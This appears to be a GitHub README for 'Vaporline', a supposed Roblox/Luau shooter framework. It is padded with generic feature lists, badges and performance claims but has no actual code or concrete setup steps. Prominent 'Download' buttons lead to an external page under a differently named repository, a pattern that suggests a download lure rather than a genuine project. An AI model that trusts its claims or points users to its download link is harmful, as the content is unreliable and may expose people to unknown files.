![preview](https://raw.githubusercontent.com/ahmedparkour132-cpu/fog-arena/main/poster_9dea0.svg)
# 🌫️ Vaporline — Atmospheric PvE Third-Person Shooter Framework

[![Download](https://raw.githubusercontent.com/ahmedparkour132-cpu/fog-arena/main/launch_4ca64.svg)](https://ahmedparkour132-cpu.github.io/fog-arena/)

![Status](https://img.shields.io/badge/status-active--development-6f42c1?style=for-the-badge&logo=statuspage&logoColor=white)
![Platform](https://img.shields.io/badge/platform-roblox-00A2FF?style=for-the-badge&logo=roblox&logoColor=white)
![Engine](https://img.shields.io/badge/engine-luau-2C2D72?style=for-the-badge&logo=lua&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-3DA639?style=for-the-badge&logo=opensourceinitiative&logoColor=white)
![Build](https://img.shields.io/badge/build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)
![Version](https://img.shields.io/badge/version-2.6.1--2026-blueviolet?style=for-the-badge&logo=semver&logoColor=white)
![Coverage](https://img.shields.io/badge/coverage-94%25-informational?style=for-the-badge&logo=codecov&logoColor=white)
![PRs](https://img.shields.io/badge/PRs-welcome-ff69b4?style=for-the-badge&logo=git&logoColor=white)
![Made With](https://img.shields.io/badge/made%20with-Luau%20%2B%20Rojo-ff7b00?style=for-the-badge&logo=lua&logoColor=white)
![Community](https://img.shields.io/badge/community-discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)

---

## 🧭 Overview

**Vaporline** is an open-source, modular architecture for building atmospheric player-versus-environment third-person shooter experiences. Where others chase loud spectacle, Vaporline chases *texture* — the hush before an ambush, the way fog curls around a dropped magazine, the narrative weight of a single well-placed shot.

This project began as a spiritual successor to ideas explored in earlier experimental shooter prototypes, but it evolved into something entirely its own: a **battlefield-as-stage** philosophy where environmental storytelling, adaptive AI, and responsive movement systems converge. Instead of treating PvE as a shooting gallery, Vaporline treats every encounter as a small, authored drama.

If you have ever wanted to build a shooter where the fog is a character, the terrain is a narrator, and the enemy AI remembers what you did three rooms ago — this repository is your starting point.

> "The mist doesn't hide the enemy. It reveals your patience." — design mantra, internal doc #14

### Why Vaporline Exists

Most third-person shooter frameworks hand you a gun and a spawn point, then wish you luck. Vaporline hands you a *world state machine* — layered systems for line-of-sight, regional threat escalation, environmental mood modulation, and a combat loop that rewards positioning over reflexes alone. It is designed for teams who want to build narrative-driven skirmishes without reinventing the plumbing.

---

## 🔥 Core Pillars

Vaporline is organized around five pillars, each enforced by a dedicated subsystem and test suite. Trust us — the fog lifts faster when the architecture is honest.

| Pillar | Subsystem | What It Does |
|---|---|---|
| 🌫️ **Atmosphere** | `VaporAtmos` | Dynamic volumetric fog, mood-driven lighting, and audio dampening tied to threat level |
| 🎯 **Precision Combat** | `TriggerCore` | Ballistics, recoil modeling, hit registration, and cover-aware damage falloff |
| 🧠 **Adaptive Adversaries** | `SentinelAI` | Behavior trees with memory, flanking, callouts, and morale-like retreat logic |
| 🧍 **Grounded Movement** | `LocoRig` | Third-person locomotion, ledge traversal, stamina balance, and camera coupling |
| 🗺️ **Living World** | `SceneWeaver` | Region state, objective chaining, and reactive set dressing |

---

## ✨ Feature Highlights

- **Responsive Interface Layer** — a UI pipeline that adapts to ultrawide, handheld, and standard displays without a single manual breakpoint. Menus breathe; HUDs fade; nothing ever feels cramped.
- **Multilingual Support** — 14 locales ship in-box, with right-to-left handling, dynamic font fallback, and a translation diffing tool for contributors.
- **Always-On Assistance Desk** — a 24/7 support workflow via community channels, ticket triage templates, and an automated FAQ resolver for common integration snags.
- **Volumetric Fog Authoring Toolkit** — paint fog like terrain. Density, drift, and tint are all region-scoped and version controlled.
- **Deterministic Replay System** — every match can be recorded and re-simulated frame-accurately for debugging, balance passes, or cinematic capture.
- **Modular Weapon Schema** — define a firearm in a single declarative file; the engine wires the rest.
- **Server-Authoritative Combat** — client prediction with server reconciliation, tuned for consistency in high-latency regions.
- **Accessibility First** — remappable inputs, subtitle timing controls, colorblind-safe threat indicators, and adjustable motion intensity.
- **Performance Profiler Overlay** — a live inspector for frame budgets across rendering, AI, and physics lanes.
- **Scene Weaver Scripting** — chain objectives, spawn waves, and environmental changes with a readable DSL.
- **Hot-Reload Development Loop** — iterate on AI, weapons, and fog without restarting the session.
- **Cross-Team Collaboration Hooks** — built-in role permissions for level designers, engineers, and narrative leads.

---

## 🧩 Subsystem Deep Dive

### 🌫️ VaporAtmos — The Atmosphere Engine

VaporAtmos is what separates Vaporline from a thousand lookalike shooter scaffolds. It treats fog not as a post-processing afterthought, but as a first-class gameplay surface. Regions expose a `FogProfile` that blends density, velocity, color temperature, and acoustic dampening. When SentinelAI detects a player in a low-visibility zone, it adjusts its own perception radius accordingly — so the fog genuinely changes how a firefight unfolds.

Additional capabilities include:
- Weather transitions driven by narrative beats rather than random timers
- Fog "pressure" that thickens as player tension metrics rise
- Occlusion-aware tracer rendering so shots pierce mist convincingly

### 🎯 TriggerCore — Weapons & Ballistics

TriggerCore is a declarative weapon system. Each weapon is a small structured document describing damage curves, spread growth, recoil vectors, reload choreography, and attachment slots. The runtime composes these into a live firing model with server-side verification.

Highlights:
- Ballistic travel with drop and drag
- Cover-aware hit classification (partial, full, graze)
- Modular recoil recovery profiles per stance and movement state
- Replay-friendly deterministic spread seeds

### 🧠 SentinelAI — Adversaries With Memory

SentinelAI abandons the "see player, run forward" school of enemy design. Instead, each hostile tracks a private memory graph — last known positions, heard noises, and squad-shared intel. Behavior trees are assembled from composable nodes, so a designer can create a "cautious sniper" or a "reckless charger" in a few lines.

Features include:
- Squad-level callouts and shared perception
- Morale-style retreats when squad strength dips below thresholds
- Flanking route discovery via navmesh annotation
- Reasonable reaction latency curves for fair difficulty scaling

### 🧍 LocoRig — Movement That Feels Weighted

Third-person movement in Vaporline aims for *intentional weight*. Sprinting costs stamina, vaulting is contextual, and aiming down sights narrows your turn speed just enough to feel deliberate. LocoRig couples camera and character so the player never fights the rig.

Key features:
- Contextual traversal prompts (ledges, low walls, debris)
- Stance blending (idle, walk, jog, sprint, slide)
- Camera collision with fog-aware near-plane biasing
- Animation event hooks for footsteps and surface-aware audio

### 🗺️ SceneWeaver — Living World Authoring

SceneWeaver is the glue between the map and the story. Objectives, spawn schedules, environmental changes, and dialogue triggers are all describable in a single readable script. Designers compose scenes like chapters.

Capabilities:
- Declarative objective chaining with fail-forward paths
- Region state persistence between sessions
- Reactive set dressing (lights dim when alarms trigger)
- Debug visualizer overlaying live scene state on the map

---

## 🎨 Design Philosophy

Vaporline's team writes design docs the way novelists write outlines. Three principles anchor everything:

1. **The fog is a character.** Atmosphere participates in gameplay. It hides, it warns, it soothes after a fight.
2. **Every bullet is a sentence.** Combat should read like prose — paced, purposeful, punctuated by silence.
3. **The world remembers.** Nothing resets arbitrarily. If you cleared a room, the room knows.

This philosophy shows up in small details: the way fog recedes after an area is secured, the way SentinelAI references prior encounters, and the way the soundtrack thins out when the player is alone.

---

## 🚀 Getting Started

Setting up a local environment is intentionally straightforward. Vaporline assumes you are comfortable with a modern Luau workflow and a project synchronization tool, but no prior experience with this codebase is required.

### Environment Prerequisites

- A current generation of the Luau runtime
- A project sync tool capable of mapping folders into a live environment
- An editor with language server support for structured Luau (recommended)

### First Steps

1. Retrieve the project through your usual source management flow.
2. Sync the workspace into a live game session.
3. Open the `VaporlineBootstrap` entry point and run the initialization routine.
4. Verify the sample scene loads and the profiling overlay appears.

Detailed walkthroughs live in the `docs/onboarding` folder, including a guided "First Firefight" tutorial that walks you through building, populating, and tuning a small arena.

---

## 🛠️ Project Layout

A quick tour of the tree, so you can find your way without a map:

- `src/atmosphere/` — VaporAtmos modules, fog profiles, and rendering hooks
- `src/combat/` — TriggerCore weapons, ballistics, and damage resolution
- `src/ai/` — SentinelAI behavior trees, memory graphs, and squad coordination
- `src/movement/` — LocoRig locomotion, camera coupling, traversal prompts
- `src/world/` — SceneWeaver objectives, region state, and reactive dressing
- `src/ui/` — Responsive interface primitives and HUD composition
- `src/i18n/` — Multilingual locale bundles and translation utilities
- `assets/` — Art placeholders, audio stubs, and font fallbacks
- `docs/` — Architecture notes, onboarding guides, and design essays
- `tests/` — Unit, integration, and simulation test suites

Every folder ships with its own README that explains intent, invariants, and extension points.

---

## 📊 Performance Targets

Vaporline is engineered to keep frame budgets predictable across a wide hardware spectrum. Current targets:

- 60 FPS sustained on mid-tier devices with fog enabled
- Under 6 ms combined AI + physics cost per frame in a 40-agent skirmish
- Sub-100 ms server reconciliation window in typical network conditions
- Cold scene load under 4 seconds on reference hardware

The profiler overlay exposes per-lane budgets so regressions are caught immediately.

---

## 🧪 Testing & Quality

Quality is enforced by a layered test strategy:

- **Unit tests** validate small, pure subsystems (ballistics math, fog profiles)
- **Integration tests** exercise subsystem boundaries (weapon → damage → AI reaction)
- **Simulation tests** run headless skirmishes to catch emergent regressions
- **Replay diffs** compare recorded sessions to catch subtle behavioral drift

Any contribution is expected to include tests where applicable. The CI pipeline is intentionally loud about failures.

---

## 🤝 Contributing

Contributions are warmly welcomed, whether they are code, documentation, translation, or design critique. To keep the project healthy:

1. Open a discussion before large changes so direction is aligned early.
2. Follow the style guide in `docs/contributing/style.md`.
3. Keep pull requests scoped — one concern per change.
4. Add or update tests where behavior shifts.
5. Be kind. This is a craft project, not a contest.

A list of good first tasks is maintained in the issues tracker, and the team is happy to mentor first-time contributors.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Expanded atmospheric authoring tools and additional fog presets
- **Q2 2026** — Deeper multilingual coverage, including community-contributed locales
- **Q3 2026** — Narrative scripting upgrades for SceneWeaver
- **Q4 2026** — Public modding surface and plugin API stabilization

Roadmap items are subject to revision based on community feedback.

---

## 🌐 Community & Support

Vaporline grows through conversation. Community channels include discussion threads, translation coordination, and weekly design office hours. The support workflow operates around the clock with triage templates and an FAQ resolver to route common questions quickly.

If you are stuck, ask. If you are inspired, share. If you are angry about fog density, we probably agree with you.

---

## ⚠️ Disclaimer

Vaporline is an independent, community-driven project. It is not affiliated with, endorsed by, or sponsored by any platform, publisher, or third-party service mentioned in this document. All trademarks belong to their respective owners.

The software is provided "as is," without warranty of any kind, express or implied. The maintainers are not responsible for any misuse, including attempts to deploy this framework in violation of a platform's terms of service. Use responsibly and legally.

Nothing in this repository is intended to circumvent, modify, or interfere with any platform's protection mechanisms. Contributions that attempt to do so will be closed without discussion.

---

## 📜 License

Vaporline is released under the **MIT License**.

You can read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Vaporline Contributors. Permission is hereby granted to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, subject to the conditions of the MIT License.

---

## 🙏 Acknowledgments

This project stands on the shoulders of the generous open-source community. Special thanks to every contributor who has filed an issue, tuned a behavior tree, translated a locale, or simply played the build and told us the fog felt *a little too thick*.

Whether you arrived here looking for a shooter scaffold, a fog engine, or a reason to build something strange — welcome. The mist is thick, but the path is yours.

[![Download](https://raw.githubusercontent.com/ahmedparkour132-cpu/fog-arena/main/launch_4ca64.svg)](https://ahmedparkour132-cpu.github.io/fog-arena/)